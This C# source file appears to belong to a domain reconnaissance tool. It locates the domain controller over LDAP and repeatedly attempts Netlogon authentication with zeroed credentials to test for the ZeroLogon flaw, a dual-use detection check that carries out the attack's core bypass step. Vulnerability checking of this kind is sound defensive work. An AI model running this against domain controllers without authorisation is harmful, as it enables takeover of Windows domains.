using System;
using static GetInfo.Netapi32;
using System.Net.NetworkInformation;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using System.Net.Sockets;
using System.Net;
namespace GetInfo
{
    class ZeroLogon
    {
        public static void ZeroLogonCheck()
        {
            Console.WriteLine("探测是否存在ZeroLogon漏洞，请等待...");
            IPGlobalProperties ipGlobalProperties = IPGlobalProperties.GetIPGlobalProperties();
            //string hostName = ipGlobalProperties.HostName;
            //string domainName = ipGlobalProperties.DomainName;

            //string Remote_Host = hostName + "." + domainName;
           // Console.WriteLine(Remote_Host);
            //Console.WriteLine("\n");

            DirectoryEntry dirEntry = new DirectoryEntry("LDAP://rootDSE");
            string Remote_Host = dirEntry.Properties["dnsHostname"].Value.ToString();
            Console.WriteLine("[+]域控的FQDN：" + Remote_Host);
            string Remote_HostName = Remote_Host.Split('.')[0];

            //string Remote_HostName = hostName;
            //Console.WriteLine(Remote_HostName);
            NETLOGON_CREDENTIAL ClientChallenge = new NETLOGON_CREDENTIAL();
            NETLOGON_CREDENTIAL ServerChallenge = new NETLOGON_CREDENTIAL();

            ulong NegotiateFlags = 0x212fffff;

            int counter = 0;

            for (int i = 0; i < 2000; i++)
            {
                counter++;
                switch (counter % 4)
                {
                    case 0: Console.Write(" /"); counter = 0; break;
                    case 1: Console.Write(" -"); break;
                    case 2: Console.Write(" \\"); break;
                    case 3: Console.Write(" |"); break;
                }


                if (I_NetServerReqChallenge(Remote_Host, Remote_HostName, ref ClientChallenge, ref ServerChallenge) != 0)
                {
                    Console.WriteLine("[-] Could not complete server challenge. Could be invalid name provided or network issues\n");
                    return;
                }

                if (I_NetServerAuthenticate2(Remote_Host, Remote_HostName + "$", NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
                    Remote_HostName, ref ClientChallenge, ref ServerChallenge, ref NegotiateFlags) == 0)
                {
                    Console.WriteLine("[+] DC is vulnerable to Zerologon attack.\n");
                    return;
                }
            }
            Console.WriteLine("\n[-] DC appear to not be vulnerable to Zerologon attack.\n");

        }

    }
}